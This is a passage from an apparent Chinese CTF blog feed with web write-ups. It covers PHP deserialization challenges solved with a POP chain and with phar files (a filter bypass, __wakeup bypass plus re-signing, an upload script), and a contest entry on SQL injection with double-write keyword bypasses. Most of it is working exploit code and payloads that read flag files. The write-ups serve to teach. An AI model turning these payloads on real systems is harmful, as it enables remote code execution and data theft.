class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sec</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;CTFers&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Easy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cla</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$fun</span>, <span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cla = <span class="hljs-keyword">clone</span> <span class="hljs-variable">$var</span>[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eeee</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>先写出pop链</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">//Start<span class="hljs-number">::</span>__destruct -&gt; S<span class="hljs-number">ec::</span>__toString -&gt; Easy<span class="hljs-number">::</span>__call -&gt; <span class="hljs-number">eeee::</span>__clone -&gt; Start<span class="hljs-number">::</span>__isset -&gt; S<span class="hljs-number">ec::</span>__invoke<br></code></pre></td></tr></table></figure><p>php7.1+反序列化对类属性不敏感，private属性时可以在序列化时改成public反序列化依然可以,但是反过来就不行了,如果是public你用private就不行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sec</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Easy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cla</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eeee</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$a</span>-&gt;name = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sec</span>();<br><span class="hljs-variable">$a</span>-&gt;name-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Easy</span>();<br><span class="hljs-variable">$a</span>-&gt;name-&gt;<span class="hljs-keyword">var</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">eeee</span>();<br><span class="hljs-variable">$a</span>-&gt;name-&gt;<span class="hljs-keyword">var</span>-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$a</span>-&gt;name-&gt;<span class="hljs-keyword">var</span>-&gt;obj-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sec</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/69577f7ec312a4f35ff94e1b.png"></p><h3 id="4-5-BUUCTF-UnserializeThree"><a href="#4-5-BUUCTF-UnserializeThree" class="headerlink" title="4.5 [BUUCTF]UnserializeThree"></a>4.5 [BUUCTF]UnserializeThree</h3><p>一打开是一个文件上传系统，查看源码发现class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/&gt;|&lt;|\?|php|&quot;</span>.<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&quot;%0a&quot;</span>).<span class="hljs-string">&quot;/i&quot;</span>,<span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>            <span class="hljs-comment">//Same point ,can you bypass me again?</span><br>            <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;#&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>发现要用phar反序列化和绕过实现RCE</p><p>这里 &lt; &gt; ? php和%0a被过滤了，所以不可以用?&gt;&lt;?php 来闭合前面的#号了，但我们还可以利用%0d</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Evil</span>();<br><span class="hljs-variable">$test</span>-&gt;cmd= <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&quot;%0d&quot;</span>).<span class="hljs-string">&#x27;system(&quot;cat /flag&quot;);&#x27;</span>;<br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;b.phar&quot;</span>); <span class="hljs-comment">//文件名</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<span class="hljs-comment">//不知道为啥，不加这行生成不了.phar文件</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetaData</span>(<span class="hljs-variable">$test</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上传文件发现.phar被ban了，那就伪装成.gif文件</p><p><img src="https://pic1.imgdb.cn/item/6957ba2b912e73dbe61268d2.png"></p><h3 id="4-6-BUUCTF-UnserializeAgain"><a href="#4-6-BUUCTF-UnserializeAgain" class="headerlink" title="4.6 [BUUCTF]UnserializeAgain"></a>4.6 [BUUCTF]UnserializeAgain</h3><p>查看源码，提示饼干，查看cookie，发现pairing.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);  <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">story</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eating</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$God</span>=<span class="hljs-string">&#x27;false&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-string">&#x27;human&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>==<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>!=<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$fffflag</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-string">&#x27;AshenOne&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;eating=<span class="hljs-string">&#x27;fire&#x27;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user.<span class="hljs-variable language_">$this</span>-&gt;pass;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">&#x27;admin&#x27;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;pass==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$nothing</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;God==<span class="hljs-string">&#x27;true&#x27;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;eating);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Get Out!&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;                 <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pear&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;apple&#x27;</span>]))&#123;<br>    <span class="hljs-comment">// $Eden=new story();</span><br>    <span class="hljs-variable">$pear</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pear&#x27;</span>];<br>    <span class="hljs-variable">$Adam</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;apple&#x27;</span>];<br>    <span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$pear</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$Adam</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;多吃雪梨&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>file_put_contents($pear,urldecode($file));是写入文件，结合后面的file_exists，可以利用phar反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">story</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eating</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$God</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">story</span>();<br><span class="hljs-variable">$a</span>-&gt;God=<span class="hljs-literal">true</span>;<br><span class="hljs-variable">$a</span>-&gt;eating=<span class="hljs-string">&#x27;cat /*&#x27;</span>;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;1.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/6957df58912e73dbe61273a2.png"></p><p>用010修改一下绕__wakeup</p><p>重新签名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.phar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    f = file.read()  <span class="hljs-comment">#打开名为1.phar的文件，以二进制只读模式读取文件内容，并将其存储到变量f中</span><br>s = f[:-<span class="hljs-number">28</span>]  <span class="hljs-comment"># 获取要签名的数据（s）</span><br>h = f[-<span class="hljs-number">8</span>:]  <span class="hljs-comment"># 获取签名类型和GBMB标识（h）</span><br>newf = s + sha1(s).digest() + h <span class="hljs-comment"># 对要签名的数据进行SHA-1哈希计算，并将原始数据、签名和类型/标识拼接成新的数据newf</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2.phar&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(newf)<br><br><span class="hljs-comment"># 将处理后的数据newf写入到一个名为newtest.phar的新文件中，以二进制写入模式。</span><br></code></pre></td></tr></table></figure><p>提交</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br>u=<span class="hljs-string">&quot;http://7edfddeb-3d9f-4b5f-8f16-f66f6afc520d.node5.buuoj.cn:81/pairing.php?pear=1.phar&amp;apple=phar://1.phar&quot;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2.phar&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> fi:<br>    f = fi.read()<br>    ff=urllib.parse.quote(f)<br>    <span class="hljs-built_in">print</span>(ff) <br>    fin=requests.post(url=u,data=ff)<br>    <br><span class="hljs-built_in">print</span>(fin.text)<br></code></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://drun1baby.top/2022/11/13/PHP-GC-%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/">PHP GC 回收机制学习 | Drunkbaby’s Blog</a></p><p><a href="https://xz.aliyun.com/news/14565">深入浅出PHP反序列化</a></p><p><a href="https://www.cnblogs.com/lktop666/articles/18581571">php反序列化</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SDPCSEC纳新赛1.0</title>
    <link href="/2025/12/20/SDPCSEC%E7%BA%B3%E6%96%B0%E8%B5%9B1/"/>
    <url>/2025/12/20/SDPCSEC%E7%BA%B3%E6%96%B0%E8%B5%9B1/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="五言"><a href="#五言" class="headerlink" title="五言"></a>五言</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$Pr0</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Pr0&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$Pr0</span>) &gt; <span class="hljs-number">5</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太太太太太长了!&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    @<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$Pr0</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>限制Pr0只能有五个字符</p><p><img src="https://pic1.imgdb.cn/item/69493bd8c154427986d9ec61.png"></p><h2 id="听说你是高玩？"><a href="#听说你是高玩？" class="headerlink" title="听说你是高玩？"></a>听说你是高玩？</h2><p>查看页面源代码发现ffffflllllaaaaaagggggg.php，一共有三个功能注册session、更新分数、获取flag</p><p>先更新一个假的分数</p><p><img src="https://pic1.imgdb.cn/item/6946732229a616e528616a79.png"></p><p>再获取flag</p><p><img src="https://pic1.imgdb.cn/item/694672e429a616e5286169f1.png"></p><h2 id="断章"><a href="#断章" class="headerlink" title="断章"></a>断章</h2><p>打开是一个注册登录，进去之后可以查询id，应该是sql注入</p><p>先试试 2-1 发现被过滤了，那再试试 2*3 发现不是整数型注入</p><p>再试 ‘ 出现报错，可以确定是字符型注入，大概长这样</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">WHERE</span> <span class="hljs-string">&#x27;id=注入点&#x27;</span><br></code></pre></td></tr></table></figure><p>下面注入 <code>1&#39; #</code> 发现#也被过滤了</p><p>一顿乱搞发现and，or，select都被替换为空了，没关系可以双写绕过</p><p>所以只要想办法把后面的单引号闭合就行了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; anandd 1=2 union selselectect database(),2,3,4 where &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span> #爆数据库<br></code></pre></td></tr></table></figure><p><strong>Terra_Data</strong></p><p>注意下面用到的information中也有or</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; anandd 1=2 union selselectect 1,2,3,group_concat(table_name)from infoorrmation_schema.tables where table_schema=&#x27;</span>Terra_Data<br></code></pre></td></tr></table></figure><p>不知道为啥，这个不行，返回none</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; anandd 1=2 union selselectect 1,2,3,group_concat(table_name)from infoorrmation_schema.tables where table_schema=database() anandd &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span> #爆表<br></code></pre></td></tr></table></figure><p><strong>secret</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; anandd 1=2 union selselectect 1,group_concat(column_name),3,4 from infoorrmation_schema.columns where table_name=&#x27;</span>secret #爆字段<br></code></pre></td></tr></table></figure><p><strong>flag</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; anandd 1=2 union selselectect group_concat(flag),2,3,4 from terra_data.secret where &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>提示没有权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; anandd 1=2 union selselectect group_concat(flag),2,3,4 from secret where &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img 